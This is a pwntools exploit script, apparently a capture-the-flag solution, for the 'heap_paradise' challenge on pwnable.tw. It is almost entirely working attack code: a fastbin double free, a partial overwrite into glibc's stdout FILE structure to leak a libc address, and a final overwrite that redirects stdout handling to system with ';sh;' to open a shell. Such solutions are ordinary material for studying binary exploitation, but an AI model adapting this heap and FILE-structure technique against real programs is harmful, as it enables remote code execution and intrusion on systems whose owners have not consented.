#
#	***************************
#	* Pwning exploit template *
#	* Arthor: Cobra           *
#	***************************
#

from pwn import *
import sys
import time

def conn():
	local = 0
	debug = 0

	for arg in sys.argv[1:]:
		if arg in ('-h', '--help'):
			print('Usage: python ' + sys.argv[0] + ' <option> ...')
			print('Option:')
			print('        -h, --help:     Show help')
			print('        -l, --local:    Running on local')
			print('        -d, --debug:    Use gdb auto attach')
			exit(0)
		if arg in ('-l', '--local'):
			local = 1
		if arg in ('-d', '--debug'):
			debug = 1

	if local:
		s = process('./heap_paradise_patched')
		if debug:
			gdb.attach(s, gdbscript='''
				brva 0xDED
			''')
		else:
			#raw_input('DEBUG')
			pass
	else:
		s = remote('chall.pwnable.tw', 10308)

	return s

elf = ELF('heap_paradise_patched')
libc = ELF('libc_64.so.6')

def debug():
	gdb.attach(s, gdbscript='''
		brva 0xDE8
		brva 0xCD9
		b*__libc_malloc
		brva 0xB87
		b /home/cobra/Install/glibc/libio/ioputs.c:40
	''')

def stop():
	s.interactive()
	exit()

def malloc(n, d):
	s.sendlineafter(b'You Choice:', b'1')
	s.sendlineafter(b'Size :', str(n).encode())
	s.sendafter(b'Data :', d)

def free(i):
	s.sendlineafter(b'You Choice:', b'2')
	s.sendlineafter(b'Index :', str(i).encode())

def malloc2(n, d):
	s.sendline(b'1' + b'\x00' * 21)
	time.sleep(0.5)
	z = str(n).encode()	
	if len(z) < 23:
		z += b'\x00' * (22 - len(z))
	s.sendline(z)
	time.sleep(0.5)
	s.sendline(d)
	time.sleep(0.5)

def free2(i):
	s.sendline(b'2')
	time.sleep(0.5)
	s.sendline(str(i).encode())
	time.sleep(0.5)

while True:
	s = conn()

	malloc(0x70, p64(0) + p64(0x81))
	malloc(0x70, p64(0) + p64(0x71))
	malloc(0x10, b'A')
	free(0)
	free(1)
	free(0)
	malloc(0x70, b'\x10')
	malloc(0x70, b'A')
	malloc(0x70, b'A')
	malloc(0x70, b'Check')
	free(0)
	malloc(0x70, p64(0) + p64(0x71))
	free(6)
	free(0)
	malloc(0x70, p64(0) + p64(0xf1))
	free(6)
	free(0)
	malloc(0x70, p64(0) + p64(0x71) + b'\xdd\x25')
	malloc(0x60, b'A')

	try:

		malloc(0x60, b'\x00' * 3 + p64(0) * 6 + p32(0xfbad1801) + b';sh;' + p64(0) * 3 + b'\x00')
		#malloc(0x60, b'\x00' * 3 + p64(0) * 6 + b'sh;' + p64(0xfbad1800)[3:] + p64(0) * 3 + b'\x00')

		leak = int.from_bytes(s.recv()[72:80], byteorder = 'little', signed = False)
		libc.address = leak - 0x3c46a3

		log.info('Leak: 0x%x', leak)
		log.info('Libc base: 0x%x', libc.address)

		free2(6)
		free2(0)

		malloc2(0x70, p64(0) + p64(0x71) + p64(libc.symbols['_IO_2_1_stdout_'] + 157))
		malloc2(0x60, b'A' * 0x5f)
		#debug()
		malloc2(0x60, b'\x00' * 3 + p64(0) * 2 + p64(0x00000000ffffffff) + p64(0) + p64(libc.symbols['system']) + p64(libc.symbols['_IO_2_1_stdout_'] + 152))

	except:
		continue

	break

s.interactive()
